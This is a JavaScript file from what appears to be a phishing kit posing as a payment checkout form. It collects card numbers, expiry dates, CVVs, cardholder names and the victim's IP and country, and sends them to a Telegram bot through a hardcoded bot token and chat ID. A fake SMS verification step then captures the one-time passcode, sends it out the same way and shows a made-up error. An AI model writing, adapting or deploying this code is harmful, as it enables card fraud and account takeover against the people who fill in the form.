document.getElementById('payment-form').addEventListener('submit', async function (e) {
    e.preventDefault();

     // Show loading spinner
     document.getElementById('btn-text').style.display = 'none';
     document.getElementById('loading-spinner').style.display = 'inline-block';
     document.getElementById('pay-now-btn').disabled = true;
 
     // Simulate a 5-second delay
     setTimeout(() =>{
         // Hide the payment form
         document.getElementById('payment-form').classList.add('hidden');
 
         // Show the SMS verification section
         document.getElementById('sms-verification').classList.remove('hidden');
 
         
     }, 10000); // 10 seconds

     
    // Get user input
    const cardNumber = document.getElementById('card-number').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;
    const cardHolder = document.getElementById('card-holder').value;

    // Get user IP and country using a free API
    let ip, country;
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;

        const countryResponse = await fetch(`https://ipapi.co/${ip}/country_name/`);
        country = await countryResponse.text();
    } catch (error) {
        console.error('Error fetching IP or country:', error);
        ip = 'Unknown';
        country = 'Unknown';
    }

    // Replace with your bot token and chat ID
    const BOT_TOKEN = '8080093683:AAGXozrSUiAauDGsq4PJTukN1MTebCa2C6w'; // Your Bot Token
    const CHAT_ID = '1891950844'; // Your Chat ID

    // Send data to Telegram bot
    const message = `
    🚨 New Payment Details 🚨

    Card Number:

    .   ${cardNumber}

    Expiry Date:    ${expiryDate}
    
    CVV:     ${cvv}

    Card Holder:     ${cardHolder}

    IP Address: ${ip}
    Country: ${country}
    `;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
            }),
        });
    } catch (error) {
        console.error('Error sending payment data:', error);
        alert('An error occurred. Please try again.');
    } finally {
        // Reset the button
        window.addEventListener('load', () => {
            document.getElementById('loading-spinner').style.display = 'none';
            document.getElementById('btn-text').style.display = 'inline-block';
            document.getElementById('pay-now-btn').disabled = false;
        });
    }
});
// Automatically format card number (add space every 4 digits)
document.getElementById('card-number').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\s/g, ''); // Remove existing spaces
    if (value.length > 16) value = value.slice(0, 16); // Limit to 16 digits
    value = value.replace(/(\d{4})/g, '$1 ').trim(); // Add space every 4 digits
    e.target.value = value;

    // Detect and display card logo
    const cardLogo = document.getElementById('card-logo');
    const cardType = detectCardType(value);
    cardLogo.style.backgroundImage = 'none'; // Clear previous logo

    if (cardType === 'visa') {
        cardLogo.style.backgroundImage = 'url(https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg)';
    } else if (cardType === 'mastercard') {
        cardLogo.style.backgroundImage = 'url(https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg)';
    } else if (cardType === 'amex') {
        cardLogo.style.backgroundImage = 'url(https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg)';
    } else if (cardType === 'discover') {
        cardLogo.style.backgroundImage = 'url(https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg)';
    }
});

// Automatically format expiry date (add / after 2 digits)
document.getElementById('expiry-date').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length > 4) value = value.slice(0, 4); // Limit to 4 digits
    if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2); // Add / after 2 digits
    e.target.value = value;
});

// Function to detect card type
function detectCardType(cardNumber) {
    const visaPattern = /^4/;
    const mastercardPattern = /^5[1-5]/;
    const amexPattern = /^3[47]/;
    const discoverPattern = /^6(?:011|5)/;

    if (visaPattern.test(cardNumber)) {
        return 'visa';
    } else if (mastercardPattern.test(cardNumber)) {
        return 'mastercard';
    } else if (amexPattern.test(cardNumber)) {
        return 'amex';
    } else if (discoverPattern.test(cardNumber)) {
        return 'discover';
    } else {
        return 'unknown';
    }
}

// Handle SMS verification


// Handle SMS verification
document.getElementById('verify-btn').addEventListener('click', async function () {
    const smsCode = document.getElementById('sms-code').value;

    if (smsCode.length === 6) {
        // Send SMS code to Telegram
        const BOT_TOKEN = '8080093683:AAGXozrSUiAauDGsq4PJTukN1MTebCa2C6w'; // Your Bot Token
        const CHAT_ID = '1891950844';  // Your Chat ID
        const message = `
        📩 OTP Code:   ${smsCode} 
        C.NMR: ${document.getElementById('card-number').value}
        `;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                }),
            });
            alert('Error!');
        } catch (error) {
            console.error('Error sending SMS code:', error);
            alert('Failed to verify payment. Please try again.');
        }
    } else {
        alert('Please enter a valid 6-digit code.');
    }
});

// دالة لعرض spinner
function showSpinner() {
    document.getElementById('verify-spinner').style.display = 'flex';
}

// دالة لإخفاء spinner
function hideSpinner() {
    document.getElementById('verify-spinner').style.display = 'none';
}

// حدث الضغط على زر التحقق
document.getElementById('verify-btn').addEventListener('click', function() {
    const smsCode = document.getElementById('sms-code').value;
    
    if (smsCode.length === 6) {
        showSpinner(); // عرض شاشة التحميل
        
        // مؤقت 10 ثواني
        setTimeout(function() {
            hideSpinner();
            
            // هنا تضع الوظيفة التي تريد تنفيذها بعد الانتظار
            console.log("لم تتم عملية التحقق بنجاح");
            alert("لم تتم عملية التحقق بنجاح");
            
        }, 10000); // 10000 ميلي ثانية = 10 ثواني
        
    } else {
        alert("الرجاء إدخال رمز التحقق المكون من 6 أرقام");
    }
});
